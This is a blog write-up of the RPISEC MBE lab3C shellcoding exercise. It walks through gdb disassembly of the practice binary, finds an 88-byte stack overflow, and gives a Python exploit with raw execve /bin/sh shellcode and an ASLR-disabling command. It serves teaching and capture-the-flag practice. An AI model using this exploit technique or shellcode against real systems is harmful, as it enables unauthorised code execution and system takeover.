<!doctype html> <html lang=""> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> shellcode lab RPISEC | Geleia </title> <meta name="author" content="Geleia "> <meta name="description" content="rpisec lab3C"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://geleiaa.github.io/blog/2023/shellcode_lab/"> <script src="/assets/js/theme.js?a5ca4084d3b81624bcfa01156dae2b8e"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>initTheme();</script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Geleia</span> </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">shellcode lab RPISEC</h1> <p class="post-meta"> December 14, 2023 </p> <p class="post-tags"> <a href="/blog/2023"> <i class="fa-solid fa-calendar fa-sm"></i> 2023 </a> &nbsp; &middot; &nbsp; <a href="/blog/category/rpisec"> <i class="fa-solid fa-tag fa-sm"></i> rpisec</a> &nbsp; <a href="/blog/category/bin-exp"> <i class="fa-solid fa-tag fa-sm"></i> bin-exp</a> &nbsp; </p> </header> <article class="post-content"> <div id="markdown-content"> <h3 id="solving-lab3c--0224---shellcoding-lab-httpsgithubcomrpisecmbeblobmastersrclab03lab3cc">Solving lab3C “| 02/24 | –[ Shellcoding Lab” (https://github.com/RPISEC/MBE/blob/master/src/lab03/lab3C.c)</h3> <h3 id="this-lab-is-a-combination-of-buffer-overflow-and-shellcode-the-intention-os-this-lab-is-explore-bof-and-execute-a-shellcode-and-get-a-shell-on-the-machine-where-the-binary-is-running-this-time-we-will-have-the-shell-part">This lab is a combination of buffer-overflow and shellcode. The intention os this lab is explore bof and execute a shellcode and get a shell on the machine where the binary is running. This time we will have the shell part.</h3> <p>First we go get the source code and compile following the instruction that is commented in the code:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -z execstack -fno-stack-protector lab3C.c -o lab3C
</code></pre></div></div> <p>Running the binary we see that it asks for a username. And when I try to enter any username, I get “incorrect username”:</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/runbin.png" alt="runbin"/></p> <p>Looking at the binary strings we see something interesting:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ strings lab3C
</code></pre></div></div> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/binstrings.png" alt="binstrings"/></p> <p>We see that the binary also asks for a password and probably this password and the username appear right above.</p> <p>We can also see a preview of the functions that binary uses:</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/binstrings2.png" alt="binstrings2"/></p> <p>Testing the username and password I get a slightly strange result…</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/testuserpass.png" alt="teste"/></p> <p>It seems that the username is correct but the password is not, or could it be that the binary doesn’t do anything at all?</p> <h3 id="after-trying-to-understand-what-the-binary-does-now-lets-move-on-to-debugging">After trying to understand what the binary does, now let’s move on to debugging</h3> <p>First, let’s take a look at the disassembly of the main function:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>disas main
Dump of assembler code <span class="k">for function </span>main:
   0x0000000000001201 &lt;+0&gt;:	endbr64 
   0x0000000000001205 &lt;+4&gt;:	push   rbp
   0x0000000000001206 &lt;+5&gt;:	mov    rbp,rsp
   0x0000000000001209 &lt;+8&gt;:	sub    rsp,0x50
   0x000000000000120d &lt;+12&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x50],0x0
   0x0000000000001215 &lt;+20&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x48],0x0
   0x000000000000121d &lt;+28&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x40],0x0
   0x0000000000001225 &lt;+36&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x38],0x0
   0x000000000000122d &lt;+44&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x30],0x0
   0x0000000000001235 &lt;+52&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x28],0x0
   0x000000000000123d &lt;+60&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x20],0x0
   0x0000000000001245 &lt;+68&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x18],0x0
   0x000000000000124d &lt;+76&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
   0x0000000000001254 &lt;+83&gt;:	lea    rdi,[rip+0xdd5]        <span class="c"># 0x2030</span>
   0x000000000000125b &lt;+90&gt;:	call   0x1090 &lt;puts@plt&gt;
   0x0000000000001260 &lt;+95&gt;:	lea    rdi,[rip+0xdf0]        <span class="c"># 0x2057</span>
   0x0000000000001267 &lt;+102&gt;:	mov    eax,0x0
   0x000000000000126c &lt;+107&gt;:	call   0x10a0 &lt;<span class="nb">printf</span>@plt&gt;
   0x0000000000001271 &lt;+112&gt;:	mov    rax,QWORD PTR <span class="o">[</span>rip+0x2da8]        <span class="c"># 0x4020 &lt;stdin@@GLIBC_2.2.5&gt;</span>
   0x0000000000001278 &lt;+119&gt;:	mov    rdx,rax
   0x000000000000127b &lt;+122&gt;:	mov    esi,0x100
   0x0000000000001280 &lt;+127&gt;:	lea    rdi,[rip+0x2db9]        <span class="c"># 0x4040 &lt;a_user_name&gt;</span>
   0x0000000000001287 &lt;+134&gt;:	call   0x10b0 &lt;fgets@plt&gt;
   0x000000000000128c &lt;+139&gt;:	mov    eax,0x0
   0x0000000000001291 &lt;+144&gt;:	call   0x11a9 &lt;verify_user_name&gt;
   0x0000000000001296 &lt;+149&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x4],eax
   0x0000000000001299 &lt;+152&gt;:	cmp    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
   0x000000000000129d &lt;+156&gt;:	je     0x12b2 &lt;main+177&gt;
   0x000000000000129f &lt;+158&gt;:	lea    rdi,[rip+0xdc2]        <span class="c"># 0x2068</span>
   0x00000000000012a6 &lt;+165&gt;:	call   0x1090 &lt;puts@plt&gt;
   0x00000000000012ab &lt;+170&gt;:	mov    eax,0x1
   0x00000000000012b0 &lt;+175&gt;:	jmp    0x1309 &lt;main+264&gt;
   0x00000000000012b2 &lt;+177&gt;:	lea    rdi,[rip+0xdcc]        <span class="c"># 0x2085</span>
   0x00000000000012b9 &lt;+184&gt;:	call   0x1090 &lt;puts@plt&gt;
   0x00000000000012be &lt;+189&gt;:	mov    rdx,QWORD PTR <span class="o">[</span>rip+0x2d5b]        <span class="c"># 0x4020 &lt;stdin@@GLIBC_2.2.5&gt;</span>
   0x00000000000012c5 &lt;+196&gt;:	lea    rax,[rbp-0x50]
   0x00000000000012c9 &lt;+200&gt;:	mov    esi,0x64
   0x00000000000012ce &lt;+205&gt;:	mov    rdi,rax
   0x00000000000012d1 &lt;+208&gt;:	call   0x10b0 &lt;fgets@plt&gt;
   0x00000000000012d6 &lt;+213&gt;:	lea    rax,[rbp-0x50]
   0x00000000000012da &lt;+217&gt;:	mov    rdi,rax
   0x00000000000012dd &lt;+220&gt;:	call   0x11d7 &lt;verify_user_pass&gt;
   0x00000000000012e2 &lt;+225&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x4],eax
   0x00000000000012e5 &lt;+228&gt;:	cmp    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
   0x00000000000012e9 &lt;+232&gt;:	je     0x12f1 &lt;main+240&gt;
   0x00000000000012eb &lt;+234&gt;:	cmp    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
   0x00000000000012ef &lt;+238&gt;:	je     0x1304 &lt;main+259&gt;
   0x00000000000012f1 &lt;+240&gt;:	lea    rdi,[rip+0xd9e]        <span class="c"># 0x2096</span>
   0x00000000000012f8 &lt;+247&gt;:	call   0x1090 &lt;puts@plt&gt;
   0x00000000000012fd &lt;+252&gt;:	mov    eax,0x1
   0x0000000000001302 &lt;+257&gt;:	jmp    0x1309 &lt;main+264&gt;
   0x0000000000001304 &lt;+259&gt;:	mov    eax,0x0
   0x0000000000001309 &lt;+264&gt;:	leave  
   0x000000000000130a &lt;+265&gt;:	ret    
End of assembler dump.
</code></pre></div></div> <p>Analyzing we can see that in main there are two more functions: <strong>verify_user_name</strong> and <strong>verify_user_pass</strong>. These are probably the functions that check the name and password input.</p> <p>And just before calling the function <strong>verify_user_name</strong> we can see that the username variable is referenced before calling a <strong>fgets</strong> which can take the name and store it in the variable. Now the function <strong>verify_user_pass</strong> does not have the password variable referenced before being called. This may mean that inputs are stored in different ways…</p> <p>Looking at the disassembly of functions, we don’t see much that is useful:</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/disasfuncs.png" alt="funcs"/></p> <p>We see that the functions probably take the input and do a comparison using the <strong>strncmp</strong> function. If we consider what we saw in the strings, these functions must compare the inputs with the values ​​”rpisec” and “admin”.</p> <h3 id="now-that-we-know-what-the-binary-does-we-can-do-some-tests-to-find-the-best-path-to-shellcode-which-is-the-idea-of-this-lab">Now that we know what the binary does, we can do some tests to find the best path to shellcode, which is the idea of ​​this lab.</h3> <p>Following with what we already know, we first have to test whether any variable can be overflowed. Putting breakpoints in the verification functions right after the input goes to the binary and put a pattern on the inputs for see how it is handled.</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/breakfuncs.png" alt="breakfuncs"/></p> <p>Let’s use the alphabet pattern like in the previous lab, so we know when there was a memory leak:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ
</code></pre></div></div> <p>After a few steps in <strong>verify_user_name</strong> we stop at the <strong>strcmp</strong> function call and see the comparison with the string “rpisec”. And we can also notice that one of <strong>strcmp</strong> arguments is “6”, which would be the number of bytes that the function will validate.</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/verfname1.png" alt="verfname"/></p> <p>So the first 6 bytes of the input have to be “rpisec”. This can be confirmed because after we go through <strong>strncmp</strong> the flow jumps to a comparison and then print “incorrect username”.</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/incorrname.png" alt="incorrname"/></p> <p>Then the execution is finished.</p> <h3 id="passing-verify_user_name">Passing verify_user_name</h3> <p>So if we put the string “rpisec” before the pattern we see that <strong>strncpm</strong> only reads the first 6 bytes and with this it is possible to pass the username check.</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/passverifname.png" alt="passverifname"/></p> <p>After passing the username verification we arrive at the <strong>verify_user_pass</strong> function. And we can see the password verification being done:</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/verifpass1.png" alt="verifpass"/></p> <p>As expected, after passing <strong>strncmp</strong> the flow jumps to a comparison and then to the end, but…</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/incorrpass.png" alt="incorrpass"/></p> <p>I noticed that no return address was overwritten, neither from <strong>verify_user_name</strong> or <strong>verify_user_pass</strong>. Until we reached the return address of the main function, which got stuck because it was overwritten by our alphabet patter.</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/retmain.png" alt="retmain"/></p> <p>We can notice that after 88 bytes of the pattern the return address of main is overwritten.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNN
|			88 bytes is stored in variable				       ||  this is overflowed  |       
|______________________________________________________________________________________||______________________|
</code></pre></div></div> <p>We have our buffer-overflow!</p> <h3 id="shellcode-time">Shellcode time</h3> <p>There came a time when I tried to put some shellcodes after the return address of the main function but I didn’t achieve anything. I was stuck for a while trying different ways and nothing.</p> <p>Until I asked for help and received tips on a better path to follow.</p> <p>In the source code, the variable that stores the username is outside the scope of the functions, that is, it is in the global scope. This means that it is in the .data section of the binary and not in the .text section where it is the executable area.</p> <p>With this we can know that the username variable will not be stored in the stack, but the password variable will. So the tip I received was to store the shellcode in the username variable and overwrite the return address in the password variable. To then “get” the shellcode in the username variable and thus execute it.</p> <h3 id="lets-go">Let’s go</h3> <p>If we look at the disassembly of the main function we see that the address of the username variable is referenced before being passed to the <strong>fgets</strong> function and then to the <strong>verify_user_name</strong> function.</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/usrnmvar1.png" alt="usernamevar"/></p> <p>And checking the variable’s memory we see the string “rpisec”.</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/usrnmvar2.png" alt="usernamevar2"/></p> <p>Now knowing the address of the username variable and also how to overwrite the return address, let’s write our exploit…</p> <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">struct</span>

<span class="n">name</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">rpisec</span><span class="sh">"</span>

<span class="c1"># addr a_user_name var that store username + 6 bytes to the shellcode addr
</span><span class="n">nameaddr</span> <span class="o">=</span> <span class="mh">0x555555558086</span>

<span class="c1"># 88 bytes to overflow
</span><span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKK</span><span class="sh">"</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="sh">"</span>

<span class="n">nm</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;Q</span><span class="sh">'</span><span class="p">,</span> <span class="n">nameaddr</span><span class="p">)</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">name</span>		<span class="c1"># pass in verify_user_name function
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">shellcode</span>        <span class="c1"># /bin/sh shellcode
</span><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span>		<span class="c1"># break line to align the buffer
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">pattern</span>          <span class="c1"># buffer to overflow password var
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">nm</span>		<span class="c1"># addr of shellcode in name var
</span>

<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">exp</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</code></pre></div></div> <p>(shellcode source: https://shell-storm.org/shellcode/files/shellcode-806.html)</p> <p>After running the python code it sends the buffer to an “exp” file. And the exploration buffer looks like this:</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/expfile.png" alt="expfile"/></p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpisec + shellcode + pattern + addr of shellcode
</code></pre></div></div> <h3 id="shell-time">Shell time</h3> <p>After running we can see that the shellcode has been stored along with the rpisec string.</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/shellcode1.png" alt="shellcode1"/></p> <p>Arriving at the ret main we see that the return address was successfully overwritten.</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/shellcode2.png" alt="shellcode2"/></p> <p>Then we see that the shellcode address has been reached and the shellcode instructions are being executed successfully.</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/shellcode3.png" alt="shellcode3"/></p> <p>With everything ok in GDB, let’s run the exploit outside the debugger to get the shell on the machine. For execution outside of gdb to work, it will be necessary to disable ASLR so that the host machine does not randomize memory addresses.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo sysctl kernel.randomize_va_space=0
</code></pre></div></div> <p>(disable aslr)</p> <p>Running the binary along with the exploit… we have the shell</p> <p><img src="https://github.com/geleiaa/lowlevel_things/blob/main/imgs/pwned.png" alt="pwned"/></p> <p>It was difficult but it worked. :)</p> </div> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> 2024 Geleia . </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?b7816bd189846d29eded8745f9c4cf77"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>